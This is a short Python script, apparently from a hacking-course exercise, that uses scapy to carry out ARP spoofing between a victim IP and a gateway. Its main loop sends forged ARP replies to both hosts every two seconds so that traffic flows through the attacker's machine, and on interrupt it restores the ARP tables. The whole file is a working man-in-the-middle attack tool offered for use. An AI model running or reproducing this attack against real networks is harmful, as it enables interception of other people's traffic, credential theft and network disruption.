#!/usr/bin/env python
import scapy.all as scapy
import optparse
import time

def getoptions():
    parser=optparse.OptionParser()
    parser.add_option("-t","--target",dest="targetip",help="Specify victim IP address ")
    parser.add_option("-r","--true",dest="trueip",help="Specify gateway ip address")
    (options,args)=parser.parse_args()
    return options

def getmac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # Creating ARP frame to send to range of ip adresses
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    # creating an ether frame to broadcast MAC Adress
    packet = broadcast / arp_request
    # combine ARP and Broadcast to make a package
    answered = scapy.srp(packet, timeout=1, verbose=False)[0]
    # sending the combined packet and capturing the recieved packets
    return answered[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=getmac(target_ip)
    packet1=scapy.ARP(op=2,pdst=target_ip,psrc=spoof_ip,hwdst=target_mac)
    scapy.send(packet1,verbose=False)

def restore(target_ip,true_ip):
    target_mac=getmac(target_ip)
    true_mac=getmac(true_ip)
    packet2=scapy.ARP(op=2,hwdst=target_mac,pdst=target_ip,hwsrc=true_mac,psrc=true_ip)
    scapy.send(packet2,verbose=False)

packetscount = 0
options=getoptions()
try:
    while True:
        spoof(options.targetip,options.trueip)
        spoof(options.trueip,options.targetip)
        #telling windows machine that I am the router
        #telling the router I am the windows machine
        packetscount=packetscount + 2
        print("\r[+]Packets sent:"+str(packetscount),end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(options.targetip,options.trueip)
    restore(options.trueip,options.targetip)
    #repairing the ARP table
    print("ARP Table repaired")
